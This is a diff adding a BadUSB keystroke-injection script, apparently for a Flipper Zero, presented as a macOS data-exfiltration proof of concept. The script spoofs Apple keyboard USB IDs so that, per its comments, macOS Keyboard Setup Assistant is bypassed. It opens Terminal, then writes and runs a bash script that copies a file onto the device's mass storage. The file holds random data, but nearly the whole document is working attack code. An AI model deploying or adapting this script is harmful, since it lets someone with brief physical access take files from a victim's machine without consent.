@@ -1,0 +1,57 @@
+ID 1234:5678 Apple:Keyboard
+REM You can change these values to VID/PID of original Apple keyboard
+REM to bypass Keyboard Setup Assistant
+
+REM Data Exfiltration PoC MacOS
+REM Tested on Ventura 13.7.8 with Intel Processor
+
+REM ESC just in case
+ESC
+
+REM Open terminal window
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 1000
+
+DEFAULT_STRING_DELAY 10
+
+REM Write some random data to a file
+STRINGLN  cd /tmp; cat /dev/urandom|head -c 25|base64 -o my_data.txt
+
+REM =================== Exfiltration PoC ===================
+
+REM Command to tell Flipper that will be exfiltration
+REM Could be place at the begining of the file (after the ID if is there)
+STORAGE
+
+REM Create a bash script to do the exfiltration
+STRINGLN cat > exfiltration.sh << EOF
+
+STRINGLN #!/bin/bash
+STRINGLN # Create a function to get the Mass Storage path
+STRINGLN gms(){ ms=\$(df|awk '/MASSSTORAGE/{print \$9}');}
+
+STRINGLN # Repeat until get the Mass Storage path 
+STRINGLN until [ \`echo \$ms 2>/dev/null\` ];do gms;done;
+
+REM Copy the generated file on the Mass Storage
+STRINGLN cp my_data.txt \$ms
+
+STRINGLN # Done :)
+STRINGLN echo done :\)
+
+STRINGLN EOF
+
+REM Execute the script
+STRINGLN sh exfiltration.sh
+
+REM =======================================================
+
+REM For demo purposes
+STRINGLN cat my_data.txt
+ENTER
+
